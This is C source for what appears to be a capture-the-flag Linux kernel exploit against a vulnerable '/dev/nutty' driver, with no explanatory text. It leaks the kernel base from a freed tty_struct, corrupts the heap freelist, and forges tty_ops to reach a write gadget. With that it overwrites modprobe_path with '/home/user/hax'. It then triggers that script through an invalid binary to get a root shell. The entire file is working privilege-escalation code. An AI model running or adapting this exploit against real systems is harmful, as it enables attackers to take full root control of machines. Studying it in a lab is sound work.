#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#define CREATE 0x13371
#define DELETE 0x13372
#define SHOW   0x13373
#define APPEND 0x13374

typedef struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
} req;

typedef struct nut {
    uint64_t size;
    char* contents;
} nut;

static int fd;
static pthread_t t;
static int try, found;
static uint64_t leak_addr;

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void create(int fd, char* buf,size_t len, size_t cont_len)
{
    req r;

    r.contents = buf;
    r.size = len;
    r.content_length = cont_len;

    if (ioctl(fd, CREATE, &r) == -1) {
        perror("ioctl create");
    }
}

static void delete(int fd, int idx)
{
    req r;
    r.idx = idx;

    if (ioctl(fd, DELETE, &r) == -1) {
        perror("ioctl delete");
    }
}

static void show(int fd, int idx, char* buf)
{
    req r;
    r.idx = idx;
    r.show_buffer = buf;

    if (ioctl(fd, SHOW, &r) == -1) {
        perror("ioctl show");
    }
}

static void append(int fd, int idx, char* buf,size_t len, size_t cont_len)
{
    req r;
    r.idx = idx;
    r.contents = buf;
    r.size = len;
    r.content_length = cont_len;

    if (ioctl(fd, APPEND, &r) == -1) {
        perror("ioctl append");
    }
}

void shell() {
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

#define TTY_OPS 0x1064f00
#define MODEPROBE_PATH 0x144cd40
/*
    0xffffffffbd8dc749:	mov    DWORD PTR [rdx],esi
    0xffffffffbd8dc74b:	ret
*/
#define GADGET 0xdc749
#define TTY_STRUCT 56;

// size <= 1024, amount <= 10
int main (void)
{
    fd = open("/dev/nutty", O_RDONLY);

    if (fd < 0) {
        perror("open");
    }

    int tty_fds[0x2];

    for (int i = 0; i < 0x2; i++) {
        tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
    for (int i = 0; i < 0x2; i++) {
        close(tty_fds[i]);
    }

    char buf[0x400];
    uint64_t* p_buf = (uint64_t*)buf;

    create(fd, buf, 0x3ff, 0);
    show(fd, 0, buf);
    delete(fd, 0);

    char poisoned[0x400];
    memcpy(poisoned, buf, sizeof(buf));

    const uint64_t kernel_base = p_buf[3] - TTY_OPS;
    const uint64_t heap_leak = p_buf[7];
    const uint64_t tty_struct = heap_leak - TTY_STRUCT;
    const uint64_t modeprobe_path = kernel_base + MODEPROBE_PATH;
    const uint64_t gadget = kernel_base + GADGET;

    printf("Kernel base: %p \n", kernel_base);
    printf("Heap leak: %p \n", heap_leak);
    printf("Tty struct: %p \n", tty_struct);
    printf("Modeprobe path: %p \n", modeprobe_path);
    printf("Gadget: %p \n", gadget);

    for (int i = 0; i < (0x400-8) / 0x8; i++) {
        p_buf[i] = tty_struct;
    }

    // victim
    tty_fds[0] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    // shuffle stuff for heap overflow && fd freelist pointer corruption
    for (int i = 0; i < 0xa; i++) {
        create(fd, "AAAAAAAAAAAAAAAA", 0x300, 0x10);
    }

    for (int i = 0; i < 0x8; i++) {
        if (i % 2 == 0) {
            delete(fd, i);
        }
    }

    for (int i = 0; i < 0x8; i++) {
        if (i % 2 != 0) {
            append(fd, i, buf, 0x10000, sizeof(buf));
        }
    }

    for (int i = 0; i < 0x1; i++) {
        create(fd, "AAAAAAAAAAAAAAAA", 0x300, 0x10);
    }

    p_buf = (uint64_t*)poisoned;
    p_buf[0] = 0x100005401;
    // tty struct is about 0x2e0 bytes. Put fake tty_ops somewhere after
    p_buf[3] = tty_struct + (8 * 0x64);

    // fake ioctl fp
    p_buf[0x64 + 12] = gadget;

    create(fd, poisoned, 0x3ff, 0x3ff);

    ioctl(tty_fds[0], 0x6d6f682f, modeprobe_path);
    ioctl(tty_fds[0], 0x73752f65, modeprobe_path + 4);
    ioctl(tty_fds[0], 0x682f7265, modeprobe_path + 8);
    ioctl(tty_fds[0], 0x007861, modeprobe_path + 12);

    puts("Triggering shell");

    shell();
}
